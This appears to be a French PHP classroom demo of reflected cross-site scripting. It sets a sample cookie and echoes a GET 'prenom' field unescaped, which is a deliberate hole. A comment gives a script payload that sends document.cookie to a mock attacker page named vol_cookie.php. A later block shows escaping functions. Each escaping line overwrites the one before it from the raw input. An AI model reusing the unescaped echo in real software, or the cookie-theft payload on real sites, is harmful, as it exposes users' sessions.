<?php
setcookie('demoXSS','données personnelles de l\'utilisateur', time()+3600);
// je traite le formulaire si _GET['prenom'] est défini "isset" et pas vide "!empty"
if(isset($_GET['prenom']) && !empty($_GET['prenom'])){
    $prenom = $_GET['prenom'];
}

// 'vol_cookie.php?cookie='+document.cookie;
//exemple de script : 
//<script>window.location='http://localhost/securite_php/_serveurpirate/vol_cookie.php?cookie='+document.cookie;</script>
?>
<form method="get">
    <input type="text" name="prenom">
    <button>Valider</button>
</form>

<?php
if(isset($_GET['prenom'])){
    echo "Bonjour $prenom";
}
?>

<!-- -------- je récupère et je protège les données --------- -->
<?php 
if(isset($_GET['prenom']) && !empty($_GET['prenom'])){
    // stripe_tags pour supprimer les balises html
    $prenom = strip_tags($_GET['prenom']);
    //trim pour supprimer les espaces
    $prenom = trim($_GET['prenom']);
    //autres
    $prenom = htmlspecialchars($_GET['prenom']);
    $prenom = htmlentities($_GET['prenom']);
}